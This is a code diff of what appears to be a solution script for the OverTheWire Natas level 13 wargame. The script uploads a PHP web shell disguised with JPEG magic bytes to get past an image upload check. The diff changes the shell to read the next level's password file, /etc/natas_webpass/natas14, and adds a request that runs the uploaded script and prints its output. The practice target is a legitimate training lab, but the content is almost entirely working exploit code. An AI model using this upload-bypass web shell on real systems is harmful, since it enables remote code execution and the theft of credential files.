@@ -51,7 +51,7 @@ if(array_key_exists("filename", $_POST)) {
 # the magic bytes for jpeg is (in hex) FF D8 FF DB
 php_script = """
 <?
-cat /etc/natas_webpass/natas14
+echo file_get_contents('/etc/natas_webpass/natas14');
 ?>
 """
 # reference: https://stackoverflow.com/questions/5649407/hexadecimal-string-to-byte-array-in-python
@@ -71,3 +71,5 @@ print(f'{div_content}\n')
 
 
 path = re.search(r'<a href="(upload/(\w+)\.php)">', str(div_content))[1]
+response = session.get(URL + path)
+print(response.text)
